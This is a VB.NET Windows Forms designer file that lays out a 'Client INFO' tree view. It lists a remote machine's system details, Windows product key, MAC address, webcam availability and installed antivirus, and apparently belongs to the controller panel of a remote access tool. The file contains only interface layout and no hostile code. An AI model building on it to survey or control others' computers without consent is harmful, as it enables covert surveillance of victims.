<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class FormInfo
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim TreeNode1 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Computer Name: ")
        Dim TreeNode2 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Username: ")
        Dim TreeNode3 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Virtual Screen Width: ")
        Dim TreeNode4 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Virtual Screen Height: ")
        Dim TreeNode5 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Available Physical Memory: ")
        Dim TreeNode6 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Available Virtual Memory: ")
        Dim TreeNode7 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Full Name: ")
        Dim TreeNode8 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Platform: ")
        Dim TreeNode9 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("OS Version: ")
        Dim TreeNode10 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Total Physical Memory: ")
        Dim TreeNode11 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Total Virtual Memory: ")
        Dim TreeNode12 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Charge Status: ")
        Dim TreeNode13 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Full Lifetime: ")
        Dim TreeNode14 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Life Percent: ")
        Dim TreeNode15 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Battery Life Remaining: ")
        Dim TreeNode16 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("CPU Info: ")
        Dim TreeNode17 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("GPU Name: ")
        Dim TreeNode18 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Uptime: ")
        Dim TreeNode19 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Computer Information", New System.Windows.Forms.TreeNode() {TreeNode1, TreeNode2, TreeNode3, TreeNode4, TreeNode5, TreeNode6, TreeNode7, TreeNode8, TreeNode9, TreeNode10, TreeNode11, TreeNode12, TreeNode13, TreeNode14, TreeNode15, TreeNode16, TreeNode17, TreeNode18})
        Dim TreeNode20 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Registered Owner: ")
        Dim TreeNode21 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Registered Organization: ")
        Dim TreeNode22 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Product Key: ")
        Dim TreeNode23 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("MAC Adress: ")
        Dim TreeNode24 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Webcam Available: ")
        Dim TreeNode25 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Installed AntiVirus Engine: ")
        Dim TreeNode26 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Server Location: ")
        Dim TreeNode27 As System.Windows.Forms.TreeNode = New System.Windows.Forms.TreeNode("Other Information", New System.Windows.Forms.TreeNode() {TreeNode20, TreeNode21, TreeNode22, TreeNode23, TreeNode24, TreeNode25, TreeNode26})
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(FormInfo))
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.TreeView1 = New System.Windows.Forms.TreeView()
        Me.ImageList_Info = New System.Windows.Forms.ImageList(Me.components)
        Me.rightclick_Info = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Panel1.SuspendLayout()
        Me.rightclick_Info.SuspendLayout()
        Me.SuspendLayout()
        '
        'Panel1
        '
        Me.Panel1.Controls.Add(Me.TreeView1)
        Me.Panel1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(955, 485)
        Me.Panel1.TabIndex = 0
        '
        'TreeView1
        '
        Me.TreeView1.ContextMenuStrip = Me.rightclick_Info
        Me.TreeView1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TreeView1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.TreeView1.ImageIndex = 13
        Me.TreeView1.ImageList = Me.ImageList_Info
        Me.TreeView1.Location = New System.Drawing.Point(0, 0)
        Me.TreeView1.Name = "TreeView1"
        TreeNode1.ImageKey = "information-white.png"
        TreeNode1.Name = "computername"
        TreeNode1.Text = "Computer Name: "
        TreeNode2.ImageKey = "user.png"
        TreeNode2.Name = "username"
        TreeNode2.Text = "Username: "
        TreeNode3.ImageKey = "monitor.png"
        TreeNode3.Name = "width"
        TreeNode3.Text = "Virtual Screen Width: "
        TreeNode4.ImageKey = "monitor.png"
        TreeNode4.Name = "height"
        TreeNode4.Text = "Virtual Screen Height: "
        TreeNode5.ImageKey = "memory.png"
        TreeNode5.Name = "apm"
        TreeNode5.Text = "Available Physical Memory: "
        TreeNode6.ImageKey = "memory.png"
        TreeNode6.Name = "avm"
        TreeNode6.Text = "Available Virtual Memory: "
        TreeNode7.ImageKey = "application-monitor.png"
        TreeNode7.Name = "osname"
        TreeNode7.Text = "OS Full Name: "
        TreeNode8.ImageKey = "application-monitor.png"
        TreeNode8.Name = "osplattform"
        TreeNode8.Text = "OS Platform: "
        TreeNode9.ImageKey = "application-monitor.png"
        TreeNode9.Name = "osversion"
        TreeNode9.Text = "OS Version: "
        TreeNode10.ImageKey = "resource-monitor.png"
        TreeNode10.Name = "tpm"
        TreeNode10.Text = "Total Physical Memory: "
        TreeNode11.ImageKey = "resource-monitor.png"
        TreeNode11.Name = "tvm"
        TreeNode11.Text = "Total Virtual Memory: "
        TreeNode12.ImageKey = "battery-charge.png"
        TreeNode12.Name = "BCS"
        TreeNode12.Text = "Battery Charge Status: "
        TreeNode13.ImageKey = "battery.png"
        TreeNode13.Name = "bfl"
        TreeNode13.Text = "Battery Full Lifetime: "
        TreeNode14.ImageKey = "battery.png"
        TreeNode14.Name = "blp"
        TreeNode14.Text = "Battery Life Percent: "
        TreeNode15.ImageKey = "battery--exclamation.png"
        TreeNode15.Name = "blr"
        TreeNode15.Text = "Battery Life Remaining: "
        TreeNode16.ImageKey = "processor.png"
        TreeNode16.Name = "cpu"
        TreeNode16.Text = "CPU Info: "
        TreeNode17.ImageKey = "graphic-card.png"
        TreeNode17.Name = "gpu"
        TreeNode17.Text = "GPU Name: "
        TreeNode18.ImageKey = "application-monitor.png"
        TreeNode18.Name = "uptime"
        TreeNode18.Text = "Uptime: "
        TreeNode19.ImageKey = "computer.png"
        TreeNode19.Name = "Knoten0"
        TreeNode19.Text = "Computer Information"
        TreeNode20.ImageKey = "user-business.png"
        TreeNode20.Name = "Knoten1"
        TreeNode20.Text = "Registered Owner: "
        TreeNode21.ImageKey = "home-medium.png"
        TreeNode21.Name = "Knoten0"
        TreeNode21.Text = "Registered Organization: "
        TreeNode22.ImageKey = "key.png"
        TreeNode22.Name = "Knoten1"
        TreeNode22.Text = "Product Key: "
        TreeNode23.ImageKey = "address-book-blue.png"
        TreeNode23.Name = "Knoten2"
        TreeNode23.Text = "MAC Adress: "
        TreeNode24.ImageKey = "webcam.png"
        TreeNode24.Name = "Knoten3"
        TreeNode24.Text = "Webcam Available: "
        TreeNode25.ImageKey = "wall.png"
        TreeNode25.Name = "Knoten4"
        TreeNode25.Text = "Installed AntiVirus Engine: "
        TreeNode26.ImageKey = "arrow.png"
        TreeNode26.Name = "Knoten5"
        TreeNode26.Text = "Server Location: "
        TreeNode27.ImageKey = "information-shield.png"
        TreeNode27.Name = "Knoten0"
        TreeNode27.Text = "Other Information"
        Me.TreeView1.Nodes.AddRange(New System.Windows.Forms.TreeNode() {TreeNode19, TreeNode27})
        Me.TreeView1.SelectedImageIndex = 13
        Me.TreeView1.ShowNodeToolTips = True
        Me.TreeView1.Size = New System.Drawing.Size(955, 485)
        Me.TreeView1.TabIndex = 2
        '
        'ImageList_Info
        '
        Me.ImageList_Info.ImageStream = CType(resources.GetObject("ImageList_Info.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList_Info.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList_Info.Images.SetKeyName(0, "alarm-clock.png")
        Me.ImageList_Info.Images.SetKeyName(1, "application-monitor.png")
        Me.ImageList_Info.Images.SetKeyName(2, "battery.png")
        Me.ImageList_Info.Images.SetKeyName(3, "battery-charge.png")
        Me.ImageList_Info.Images.SetKeyName(4, "battery--exclamation.png")
        Me.ImageList_Info.Images.SetKeyName(5, "graphic-card.png")
        Me.ImageList_Info.Images.SetKeyName(6, "information.png")
        Me.ImageList_Info.Images.SetKeyName(7, "information-white.png")
        Me.ImageList_Info.Images.SetKeyName(8, "user.png")
        Me.ImageList_Info.Images.SetKeyName(9, "resource-monitor.png")
        Me.ImageList_Info.Images.SetKeyName(10, "processor.png")
        Me.ImageList_Info.Images.SetKeyName(11, "monitor.png")
        Me.ImageList_Info.Images.SetKeyName(12, "memory.png")
        Me.ImageList_Info.Images.SetKeyName(13, "selection.png")
        Me.ImageList_Info.Images.SetKeyName(14, "computer.png")
        Me.ImageList_Info.Images.SetKeyName(15, "information-shield.png")
        Me.ImageList_Info.Images.SetKeyName(16, "user-business.png")
        Me.ImageList_Info.Images.SetKeyName(17, "home-medium.png")
        Me.ImageList_Info.Images.SetKeyName(18, "key.png")
        Me.ImageList_Info.Images.SetKeyName(19, "address-book-blue.png")
        Me.ImageList_Info.Images.SetKeyName(20, "webcam.png")
        Me.ImageList_Info.Images.SetKeyName(21, "wall.png")
        Me.ImageList_Info.Images.SetKeyName(22, "arrow.png")
        '
        'rightclick_Info
        '
        Me.rightclick_Info.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem})
        Me.rightclick_Info.Name = "rightclick_Info"
        Me.rightclick_Info.Size = New System.Drawing.Size(114, 26)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.Image = CType(resources.GetObject("RefreshToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(113, 22)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'FormInfo
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(955, 485)
        Me.Controls.Add(Me.Panel1)
        Me.Name = "FormInfo"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Client INFO"
        Me.Panel1.ResumeLayout(False)
        Me.rightclick_Info.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents ImageList_Info As System.Windows.Forms.ImageList
    Friend WithEvents TreeView1 As System.Windows.Forms.TreeView
    Friend WithEvents rightclick_Info As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RefreshToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
End Class
